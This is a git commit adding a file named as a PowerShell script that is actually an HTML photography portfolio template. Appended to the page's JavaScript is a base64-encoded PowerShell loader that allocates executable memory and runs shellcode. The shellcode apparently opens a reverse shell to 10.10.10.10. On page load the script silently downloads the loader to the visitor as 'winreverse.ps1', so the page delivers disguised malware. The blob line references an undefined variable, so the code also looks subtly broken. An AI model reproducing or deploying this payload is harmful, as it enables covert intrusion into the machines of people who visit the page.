1fb4fdb6e183f2254f8f87d1e0200e6e2288fa50
AdeolaMercy <mercycharis44@gmail.com>
2024-07-12 12:08:43 +0100

    Create indexpshrvs.ps1

---
+++ indexpshrvs.ps1
@@ -0,0 +1,318 @@
+
+<html>
+    <body>
+
+    </body>
+</html>
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Test website</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="/css/w3.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+body,h1,h2,h3,h4,h5,h6 {font-family: "Lato", sans-serif;}
+body, html {
+  height: 100%;
+  color: #777;
+  line-height: 1.8;
+}
+
+/* Create a Parallax Effect */
+.bgimg-1, .bgimg-2, .bgimg-3 {
+  background-attachment: fixed;
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;
+}
+
+/* First image (Logo. Full height) */
+.bgimg-1 {
+  background-image: url('/img/parallax1.jpg');
+  min-height: 100%;
+}
+
+/* Second image (Portfolio) */
+.bgimg-2 {
+  background-image: url("/img/parallax2.jpg");
+  min-height: 400px;
+}
+
+/* Third image (Contact) */
+.bgimg-3 {
+  background-image: url("/img/parallax3.jpg");
+  min-height: 400px;
+}
+
+.w3-wide {letter-spacing: 10px;}
+.w3-hover-opacity {cursor: pointer;}
+
+/* Turn off parallax scrolling for tablets and phones */
+@media only screen and (max-device-width: 1600px) {
+  .bgimg-1, .bgimg-2, .bgimg-3 {
+    background-attachment: scroll;
+    min-height: 400px;
+  }
+}
+</style>
+</head>
+<body>
+
+<!-- Navbar (sit on top) -->
+<div class="w3-top">
+  <div class="w3-bar" id="myNavbar">
+    <a class="w3-bar-item w3-button w3-hover-black w3-hide-medium w3-hide-large w3-right" href="javascript:void(0);" onclick="toggleFunction()" title="Toggle Navigation Menu">
+      <i class="fa fa-bars"></i>
+    </a>
+    <a href="#home" class="w3-bar-item w3-button">HOME</a>
+    <a href="#about" class="w3-bar-item w3-button w3-hide-small"><i class="fa fa-user"></i> ABOUT</a>
+    <a href="#portfolio" class="w3-bar-item w3-button w3-hide-small"><i class="fa fa-th"></i> PORTFOLIO</a>
+    <a href="#contact" class="w3-bar-item w3-button w3-hide-small"><i class="fa fa-envelope"></i> CONTACT</a>
+    <a href="#" class="w3-bar-item w3-button w3-hide-small w3-right w3-hover-red">
+      <i class="fa fa-search"></i>
+    </a>
+  </div>
+
+  <!-- Navbar on small screens -->
+  <div id="navDemo" class="w3-bar-block w3-white w3-hide w3-hide-large w3-hide-medium">
+    <a href="#about" class="w3-bar-item w3-button" onclick="toggleFunction()">ABOUT</a>
+    <a href="#portfolio" class="w3-bar-item w3-button" onclick="toggleFunction()">PORTFOLIO</a>
+    <a href="#contact" class="w3-bar-item w3-button" onclick="toggleFunction()">CONTACT</a>
+    <a href="#" class="w3-bar-item w3-button">SEARCH</a>
+  </div>
+</div>
+
+<!-- First Parallax Image with Logo Text -->
+<div class="bgimg-1 w3-display-container w3-opacity-min" id="home">
+  <div class="w3-display-middle" style="white-space:nowrap;">
+    <span class="w3-center w3-padding-large w3-black w3-xlarge w3-wide w3-animate-opacity">MY <span class="w3-hide-small">WEBSITE</span> LOGO</span>
+  </div>
+</div>
+
+<!-- Container (About Section) -->
+<div class="w3-content w3-container w3-padding-64" id="about">
+  <h3 class="w3-center">ABOUT ME</h3>
+  <p class="w3-center"><em>I love photography</em></p>
+  <p>We have created a fictional "personal" website/blog, and our fictional character is a hobby photographer. Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
+    quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa
+    qui officia deserunt mollit anim id est laborum consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
+  <div class="w3-row">
+    <div class="w3-col m6 w3-center w3-padding-large">
+      <p><b><i class="fa fa-user w3-margin-right"></i>My Name</b></p><br>
+      <img src="/img/avatar_hat.jpg" class="w3-round w3-image w3-opacity w3-hover-opacity-off" alt="Photo of Me" width="500" height="333">
+    </div>
+
+    <!-- Hide this text on small devices -->
+    <div class="w3-col m6 w3-hide-small w3-padding-large">
+      <p>Welcome to my website. I am lorem ipsum consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure
+        dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum consectetur adipiscing elit, sed do eiusmod tempor
+        incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
+    </div>
+  </div>
+  <p class="w3-large w3-center w3-padding-16">Im really good at:</p>
+  <p class="w3-wide"><i class="fa fa-camera"></i>Photography</p>
+  <div class="w3-light-grey">
+    <div class="w3-container w3-padding-small w3-dark-grey w3-center" style="width:90%">90%</div>
+  </div>
+  <p class="w3-wide"><i class="fa fa-laptop"></i>Web Design</p>
+  <div class="w3-light-grey">
+    <div class="w3-container w3-padding-small w3-dark-grey w3-center" style="width:85%">85%</div>
+  </div>
+  <p class="w3-wide"><i class="fa fa-photo"></i>Photoshop</p>
+  <div class="w3-light-grey">
+    <div class="w3-container w3-padding-small w3-dark-grey w3-center" style="width:75%">75%</div>
+  </div>
+</div>
+
+<div class="w3-row w3-center w3-dark-grey w3-padding-16">
+  <div class="w3-quarter w3-section">
+    <span class="w3-xlarge">14+</span><br>
+    Partners
+  </div>
+  <div class="w3-quarter w3-section">
+    <span class="w3-xlarge">55+</span><br>
+    Projects Done
+  </div>
+  <div class="w3-quarter w3-section">
+    <span class="w3-xlarge">89+</span><br>
+    Happy Clients
+  </div>
+  <div class="w3-quarter w3-section">
+    <span class="w3-xlarge">150+</span><br>
+    Meetings
+  </div>
+</div>
+
+<!-- Second Parallax Image with Portfolio Text -->
+<div class="bgimg-2 w3-display-container w3-opacity-min">
+  <div class="w3-display-middle">
+    <span class="w3-xxlarge w3-text-white w3-wide">PORTFOLIO</span>
+  </div>
+</div>
+
+<!-- Container (Portfolio Section) -->
+<div class="w3-content w3-container w3-padding-64" id="portfolio">
+  <h3 class="w3-center">MY WORK</h3>
+  <p class="w3-center"><em>Here are some of my latest lorem work ipsum tipsum.<br> Click on the images to make them bigger</em></p><br>
+
+  <!-- Responsive Grid. Four columns on tablets, laptops and desktops. Will stack on mobile devices/small screens (100% width) -->
+  <div class="w3-row-padding w3-center">
+    <div class="w3-col m3">
+      <img src="/img/p1.jpg" style="width:100%" onclick="onClick(this)" class="w3-hover-opacity" alt="The mist over the mountains">
+    </div>
+
+    <div class="w3-col m3">
+      <img src="/img/p2.jpg" style="width:100%" onclick="onClick(this)" class="w3-hover-opacity" alt="Coffee beans">
+    </div>
+
+    <div class="w3-col m3">
+      <img src="/img/p3.jpg" style="width:100%" onclick="onClick(this)" class="w3-hover-opacity" alt="Bear closeup">
+    </div>
+
+    <div class="w3-col m3">
+      <img src="/img/p4.jpg" style="width:100%" onclick="onClick(this)" class="w3-hover-opacity" alt="Quiet ocean">
+    </div>
+  </div>
+
+  <div class="w3-row-padding w3-center w3-section">
+    <div class="w3-col m3">
+      <img src="/img/p5.jpg" style="width:100%" onclick="onClick(this)" class="w3-hover-opacity" alt="The mist">
+    </div>
+
+    <div class="w3-col m3">
+      <img src="/img/p6.jpg" style="width:100%" onclick="onClick(this)" class="w3-hover-opacity" alt="My beloved typewriter">
+    </div>
+
+    <div class="w3-col m3">
+      <img src="/img/p7.jpg" style="width:100%" onclick="onClick(this)" class="w3-hover-opacity" alt="Empty ghost train">
+    </div>
+
+    <div class="w3-col m3">
+      <img src="/img/p8.jpg" style="width:100%" onclick="onClick(this)" class="w3-hover-opacity" alt="Sailing">
+    </div>
+    <button class="w3-button w3-padding-large w3-light-grey" style="margin-top:64px">LOAD MORE</button>
+  </div>
+</div>
+
+<!-- Modal for full size images on click-->
+<div id="modal01" class="w3-modal w3-black" onclick="this.style.display='none'">
+  <span class="w3-button w3-large w3-black w3-display-topright" title="Close Modal Image"><i class="fa fa-remove"></i></span>
+  <div class="w3-modal-content w3-animate-zoom w3-center w3-transparent w3-padding-64">
+    <img id="img01" class="w3-image">
+    <p id="caption" class="w3-opacity w3-large"></p>
+  </div>
+</div>
+
+<!-- Third Parallax Image with Portfolio Text -->
+<div class="bgimg-3 w3-display-container w3-opacity-min">
+  <div class="w3-display-middle">
+     <span class="w3-xxlarge w3-text-white w3-wide">CONTACT</span>
+  </div>
+</div>
+
+<!-- Container (Contact Section) -->
+<div class="w3-content w3-container w3-padding-64" id="contact">
+  <h3 class="w3-center">WHERE I WORK</h3>
+  <p class="w3-center"><em>I'd love your feedback!</em></p>
+
+  <div class="w3-row w3-padding-32 w3-section">
+    <div class="w3-col m4 w3-container">
+      <img src="/img/map.jpg" class="w3-image w3-round" style="width:100%">
+    </div>
+    <div class="w3-col m8 w3-panel">
+      <div class="w3-large w3-margin-bottom">
+        <i class="fa fa-map-marker fa-fw w3-hover-text-black w3-xlarge w3-margin-right"></i> Chicago, US<br>
+        <i class="fa fa-phone fa-fw w3-hover-text-black w3-xlarge w3-margin-right"></i> Phone: +00 151515<br>
+        <i class="fa fa-envelope fa-fw w3-hover-text-black w3-xlarge w3-margin-right"></i> Email: mail@mail.com<br>
+      </div>
+      <p>Swing by for a cup of <i class="fa fa-coffee"></i>, or leave me a note:</p>
+      <form action="/action_page.php" target="_blank">
+        <div class="w3-row-padding" style="margin:0 -16px 8px -16px">
+          <div class="w3-half">
+            <input class="w3-input w3-border" type="text" placeholder="Name" required name="Name">
+          </div>
+          <div class="w3-half">
+            <input class="w3-input w3-border" type="text" placeholder="Email" required name="Email">
+          </div>
+        </div>
+        <input class="w3-input w3-border" type="text" placeholder="Message" required name="Message">
+        <button class="w3-button w3-black w3-right w3-section" type="submit">
+          <i class="fa fa-paper-plane"></i> SEND MESSAGE
+        </button>
+      </form>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<footer class="w3-center w3-black w3-padding-64 w3-opacity w3-hover-opacity-off">
+  <a href="#home" class="w3-button w3-light-grey"><i class="fa fa-arrow-up w3-margin-right"></i>To the top</a>
+  <div class="w3-xlarge w3-section">
+    <i class="fa fa-facebook-official w3-hover-opacity"></i>
+    <i class="fa fa-instagram w3-hover-opacity"></i>
+    <i class="fa fa-snapchat w3-hover-opacity"></i>
+    <i class="fa fa-pinterest-p w3-hover-opacity"></i>
+    <i class="fa fa-twitter w3-hover-opacity"></i>
+    <i class="fa fa-linkedin w3-hover-opacity"></i>
+  </div>
+  <p>Powered by <a href="https://www.w3schools.com/w3css/default.asp" title="W3.CSS" target="_blank" class="w3-hover-text-green">w3.css</a></p>
+</footer>
+ 
+<script>
+// Modal Image Gallery
+function onClick(element) {
+  document.getElementById("img01").src = element.src;
+  document.getElementById("modal01").style.display = "block";
+  var captionText = document.getElementById("caption");
+  captionText.innerHTML = element.alt;
+}
+
+// Change style of navbar on scroll
+window.onscroll = function() {myFunction()};
+function myFunction() {
+    var navbar = document.getElementById("myNavbar");
+    if (document.body.scrollTop > 100 || document.documentElement.scrollTop > 100) {
+        navbar.className = "w3-bar" + " w3-card" + " w3-animate-top" + " w3-white";
+    } else {
+        navbar.className = navbar.className.replace(" w3-card w3-animate-top w3-white", "");
+    }
+}
+
+// Used to toggle the menu on small screens when clicking on the menu button
+function toggleFunction() {
+    var x = document.getElementById("navDemo");
+    if (x.className.indexOf("w3-show") == -1) {
+        x.className += " w3-show";
+    } else {
+        x.className = x.className.replace(" w3-show", "");
+    }
+}
+// 'p' '  s'   'h'   'e    'l
+function base64ToArrayBuffer(base64) {
+    var binary_string = window.atob(base64);
+    var len = binary_string.length;
+    var bytes = new Uint8Array( len );
+    for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+    return bytes.buffer;
+}
+var file ='JFdpdHBIcE9LID0gQCINCltEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvYyhJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbEFsbG9jYXRpb25UeXBlLCB1aW50IGZsUHJvdGVjdCk7DQpbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgSW50UHRyIGxwU3RhcnRBZGRyZXNzLCBJbnRQdHIgbHBQYXJhbWV0ZXIsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBUaHJlYWRJZCk7DQoiQA0KDQokQUFqZEtKUGpUcFVYWiA9IEFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICRXaXRwSHBPSyAtTmFtZSAiV2luMzIiIC1uYW1lc3BhY2UgV2luMzJGdW5jdGlvbnMgLXBhc3N0aHJ1DQoNCltCeXRlW11dICRYSnFMb2FzYW13TGhvaSA9IDB4ZmMsMHg0OCwweDgzLDB4ZTQsMHhmMCwweGU4LDB4YzAsMHgwLDB4MCwweDAsMHg0MSwweDUxLDB4NDEsMHg1MCwweDUyLDB4NTEsMHg1NiwweDQ4LDB4MzEsMHhkMiwweDY1LDB4NDgsMHg4YiwweDUyLDB4NjAsMHg0OCwweDhiLDB4NTIsMHgxOCwweDQ4LDB4OGIsMHg1MiwweDIwLDB4NDgsMHg4YiwweDcyLDB4NTAsMHg0OCwweGYsMHhiNywweDRhLDB4NGEsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsMHhhYywweDNjLDB4NjEsMHg3YywweDIsMHgyYywweDIwLDB4NDEsMHhjMSwweGM5LDB4ZCwweDQxLDB4MSwweGMxLDB4ZTIsMHhlZCwweDUyLDB4NDEsMHg1MSwweDQ4LDB4OGIsMHg1MiwweDIwLDB4OGIsMHg0MiwweDNjLDB4NDgsMHgxLDB4ZDAsMHg4YiwweDgwLDB4ODgsMHgwLDB4MCwweDAsMHg0OCwweDg1LDB4YzAsMHg3NCwweDY3LDB4NDgsMHgxLDB4ZDAsMHg1MCwweDhiLDB4NDgsMHgxOCwweDQ0LDB4OGIsMHg0MCwweDIwLDB4NDksMHgxLDB4ZDAsMHhlMywweDU2LDB4NDgsMHhmZiwweGM5LDB4NDEsMHg4YiwweDM0LDB4ODgsMHg0OCwweDEsMHhkNiwweDRkLDB4MzEsMHhjOSwweDQ4LDB4MzEsMHhjMCwweGFjLDB4NDEsMHhjMSwweGM5LDB4ZCwweDQxLDB4MSwweGMxLDB4MzgsMHhlMCwweDc1LDB4ZjEsMHg0YywweDMsMHg0YywweDI0LDB4OCwweDQ1LDB4MzksMHhkMSwweDc1LDB4ZDgsMHg1OCwweDQ0LDB4OGIsMHg0MCwweDI0LDB4NDksMHgxLDB4ZDAsMHg2NiwweDQxLDB4OGIsMHhjLDB4NDgsMHg0NCwweDhiLDB4NDAsMHgxYywweDQ5LDB4MSwweGQwLDB4NDEsMHg4YiwweDQsMHg4OCwweDQ4LDB4MSwweGQwLDB4NDEsMHg1OCwweDQxLDB4NTgsMHg1ZSwweDU5LDB4NWEsMHg0MSwweDU4LDB4NDEsMHg1OSwweDQxLDB4NWEsMHg0OCwweDgzLDB4ZWMsMHgyMCwweDQxLDB4NTIsMHhmZiwweGUwLDB4NTgsMHg0MSwweDU5LDB4NWEsMHg0OCwweDhiLDB4MTIsMHhlOSwweDU3LDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg0OSwweGJlLDB4NzcsMHg3MywweDMyLDB4NWYsMHgzMywweDMyLDB4MCwweDAsMHg0MSwweDU2LDB4NDksMHg4OSwweGU2LDB4NDgsMHg4MSwweGVjLDB4YTAsMHgxLDB4MCwweDAsMHg0OSwweDg5LDB4ZTUsMHg0OSwweGJjLDB4MiwweDAsMHg0LDB4ZDIsMHhhLDB4YSwweGEsMHhhLDB4NDEsMHg1NCwweDQ5LDB4ODksMHhlNCwweDRjLDB4ODksMHhmMSwweDQxLDB4YmEsMHg0YywweDc3LDB4MjYsMHg3LDB4ZmYsMHhkNSwweDRjLDB4ODksMHhlYSwweDY4LDB4MSwweDEsMHgwLDB4MCwweDU5LDB4NDEsMHhiYSwweDI5LDB4ODAsMHg2YiwweDAsMHhmZiwweGQ1LDB4NTAsMHg1MCwweDRkLDB4MzEsMHhjOSwweDRkLDB4MzEsMHhjMCwweDQ4LDB4ZmYsMHhjMCwweDQ4LDB4ODksMHhjMiwweDQ4LDB4ZmYsMHhjMCwweDQ4LDB4ODksMHhjMSwweDQxLDB4YmEsMHhlYSwweGYsMHhkZiwweGUwLDB4ZmYsMHhkNSwweDQ4LDB4ODksMHhjNywweDZhLDB4MTAsMHg0MSwweDU4LDB4NGMsMHg4OSwweGUyLDB4NDgsMHg4OSwweGY5LDB4NDEsMHhiYSwweDk5LDB4YTUsMHg3NCwweDYxLDB4ZmYsMHhkNSwweDQ4LDB4ODEsMHhjNCwweDQwLDB4MiwweDAsMHgwLDB4NDksMHhiOCwweDYzLDB4NmQsMHg2NCwweDAsMHgwLDB4MCwweDAsMHgwLDB4NDEsMHg1MCwweDQxLDB4NTAsMHg0OCwweDg5LDB4ZTIsMHg1NywweDU3LDB4NTcsMHg0ZCwweDMxLDB4YzAsMHg2YSwweGQsMHg1OSwweDQxLDB4NTAsMHhlMiwweGZjLDB4NjYsMHhjNywweDQ0LDB4MjQsMHg1NCwweDEsMHgxLDB4NDgsMHg4ZCwweDQ0LDB4MjQsMHgxOCwweGM2LDB4MCwweDY4LDB4NDgsMHg4OSwweGU2LDB4NTYsMHg1MCwweDQxLDB4NTAsMHg0MSwweDUwLDB4NDEsMHg1MCwweDQ5LDB4ZmYsMHhjMCwweDQxLDB4NTAsMHg0OSwweGZmLDB4YzgsMHg0ZCwweDg5LDB4YzEsMHg0YywweDg5LDB4YzEsMHg0MSwweGJhLDB4NzksMHhjYywweDNmLDB4ODYsMHhmZiwweGQ1LDB4NDgsMHgzMSwweGQyLDB4NDgsMHhmZiwweGNhLDB4OGIsMHhlLDB4NDEsMHhiYSwweDgsMHg4NywweDFkLDB4NjAsMHhmZiwweGQ1LDB4YmIsMHhmMCwweGI1LDB4YTIsMHg1NiwweDQxLDB4YmEsMHhhNiwweDk1LDB4YmQsMHg5ZCwweGZmLDB4ZDUsMHg0OCwweDgzLDB4YzQsMHgyOCwweDNjLDB4NiwweDdjLDB4YSwweDgwLDB4ZmIsMHhlMCwweDc1LDB4NSwweGJiLDB4NDcsMHgxMywweDcyLDB4NmYsMHg2YSwweDAsMHg1OSwweDQxLDB4ODksMHhkYSwweGZmLDB4ZDUNCg0KDQokZEViWWVvSW1rRiA9ICRBQWpkS0pQalRwVVhaOjpWaXJ0dWFsQWxsb2MoMCxbTWF0aF06Ok1heCgkWEpxTG9hc2Ftd0xob2kuTGVuZ3RoLDB4MTAwMCksMHgzMDAwLDB4NDApDQoNCltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJFhKcUxvYXNhbXdMaG9pLDAsJGRFYlllb0lta0YsJFhKcUxvYXNhbXdMaG9pLkxlbmd0aCkNCg0KJEFBamRLSlBqVHBVWFo6OkNyZWF0ZVRocmVhZCgwLDAsJGRFYlllb0lta0YsMCwwLDApDQo='
+var blob = new Blob([data], {type: 'octet/stream'});
+var fileName = 'winreverse.ps1';
+
+var a = document.createElement('a');
+document.body.appendChild(a);
+a.style = 'display: none';
+var url = window.URL.createObjectURL(blob);
+a.href = url;
+a.download = fileName;
+a.click();
+window.URL.revokeObjectURL(url);
+
+</script>
+
+</body>
+</html>
